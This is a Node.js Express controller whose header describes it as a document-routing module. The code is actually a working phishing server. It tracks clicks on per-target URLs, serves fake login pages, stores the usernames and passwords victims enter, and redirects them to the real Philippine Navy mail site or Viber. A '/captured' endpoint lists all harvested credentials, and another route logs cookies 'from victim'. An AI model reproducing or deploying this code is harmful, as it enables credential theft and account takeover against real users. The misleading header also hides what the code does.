/*
Controller Module for Processing Incoming Documents
- handles operations for all documents inside the incoming folder such as routing, classifying, and Machine Learning.
- handles client login, logout, and files checking every interval.

@module Incoming
@author Nelson Maligro
@copyright 2020
@license GPL
*/
module.exports = function(app) {
  const FlatDB = require('flat-db');
  var fs = require('fs');
  var path = require('path');
  var bodyParser = require('body-parser');
  const cookieParser = require('cookie-parser');
  var promise = require('promise');
  const crypto = require('crypto');
  const jwt = require('jsonwebtoken');
  const passport = require('passport');
  var localStrategy = require('passport-local').Strategy;
  const date = require('date-and-time');
  var url = require('url');
  FlatDB.configure({ dir: 'models/storage'});
  // create accounts collection with schema
  const accounts = new FlatDB.Collection('accnts', {username: String, password: String, permit: String});
  app.use(bodyParser.json()) // parse application/json
  app.use(passport.initialize());
  app.use(require('express-session')({ secret: 'secret@@@2023', resave: true, saveUninitialized: true }));
  app.use(passport.session());

  //initialize url encoding, cookies, and default drive path
  app.use(cookieParser());
  var urlencodedParser = bodyParser.urlencoded({extended:true});
   //
    //---------------------------------- Express app handling starts here --------------------------------------------------
    //post handle add message to regular
    app.post('/sendcookie', urlencodedParser, function(req,res){
      submitcookie(req, res);
    });
      //get handle test API running on web
      app.get('/user/:cookie',function(req,res){
        //utilsdocms.validToken(req, res,  function(decoded, id){
           displayMsg(req, res);
        //});
      });
     //get handle test API running on web
      app.get('/userviber/:cookie',function(req,res){
        //utilsdocms.validToken(req, res,  function(decoded, id){
           displayMsgViber(req, res);
        //});
      });
      //post incoming with params
          app.post('/', urlencodedParser, function(req,res){
            captureCred(req,res);
          });

    //
     //post incoming with params
          app.post('/viber', urlencodedParser, function(req,res){
            captureCredViber(req,res);
          });

    //
    //show all captured credentials
    app.get('/captured',function(req,res){
      //utilsdocms.validToken(req, res,  function(decoded, id){
        strDisp = "";arr = accounts.all();
        arr.forEach(e => {
	  strDisp = strDisp + e.permit + "::" + e.username + "::" + e.password + "<br/>"; 
	});
	res.send(strDisp);
      //});
    });
    //------------------------------------------FUNCTIONS START HERE----------------------------------------------------
    function captureCred(req, res){
      let deyt = date.format(new Date,'MM-DD-YYYY'); var taym = date.format(new Date,'hh:mm:ss A');
      let disMsg = deyt + "-" + taym;
      if ((req.body.username!="undefined") && (req.body.username.trim()!="")) {
	 console.log("credential:" + req.body.username +"::" + disMsg);
         logs(req.body.username, 'CredentialCaptured::');
         accounts.add({username:req.body.username,password:req.body.password,permit:'CredentialCaptured::' + disMsg});
         res.redirect('https://mail.navy.mil.ph');
      }
    }
    function captureCredViber(req, res){
      let deyt = date.format(new Date,'MM-DD-YYYY'); var taym = date.format(new Date,'hh:mm:ss A');
      let disMsg = deyt + "-" + taym;
      var urlParts = url.parse(req.url);
      if ((req.body.password!="undefined") && (req.body.password.trim()!="")) {
         console.log("credentialViber:" + req.body.password +"::" + disMsg);
         logs(req.body.password, 'CredentialCapturedViber::');
         accounts.add({username:req.body.username,password:req.body.password,permit:'CredentialCapturedViber::' + disMsg});
         res.redirect('https://viber.com');
      }
    }
    //Temporary display message to HTTP
    function displayMsg(req, res){
      try {
        //accounts.reset();
        //accounts.add({username:'nelson',password:'***demopassword***', permit:'allowed'});
        let deyt = date.format(new Date,'MM-DD-YYYY'); var taym = date.format(new Date,'hh:mm:ss A');
        let disMsg = deyt + "-" + taym;
	console.log("clickURL:" + req.params.cookie + "::" + disMsg);
        logs(req.params.cookie,'ClickedURL::');
	accounts.add({username:req.params.cookie,password:'***',permit:'ClickedURL::' + disMsg});
        res.render('login', {layout:'layout'});
      } catch(err){console.log(err);}
    };
//Temporary display message to HTTP
    function displayMsgViber(req, res){
      try {
        //accounts.reset();
        //accounts.add({username:'nelson',password:'***demopassword***', permit:'allowed'});
        let deyt = date.format(new Date,'MM-DD-YYYY'); var taym = date.format(new Date,'hh:mm:ss A');
        let disMsg = deyt + "-" + taym;
        console.log("clickURLViber:" + req.params.cookie + "::" + disMsg);
        logs(req.params.cookie,'ClickedURLViber::');
        accounts.add({username:req.params.cookie,password:'***',permit:'ClickedURLViber::' + disMsg});
        res.render('loginviber', {layout:'layoutviber', name:req.params.cookie});
      } catch(err){console.log(err);}
    };
    //function for logs
    function logs(usr, msg){
      let deyt = date.format(new Date,'MM-DD-YYYY'); var taym = date.format(new Date,'hh:mm:ss A');
      let disMsg = deyt + "::" + taym + "::" + usr + "::" + msg;
      fs.appendFileSync('logs/log-'+ deyt +'.log',disMsg + '\n');
    }
    //process insert message regular
    function submitcookie(req, res){
      try {
        //console.log(req.body.cookie);
        console.log(req.headers.cookie)
        //accounts.reset();
        //accounts.add({cookie:req.body.cookie,username:'juan@navy.mil.ph',password:'***demopassword***', permit:'allowed'});
          res.json("cookie added");
          console.log("Add cookie from victim ");
      } catch(err){console.log(err);}
    };
};
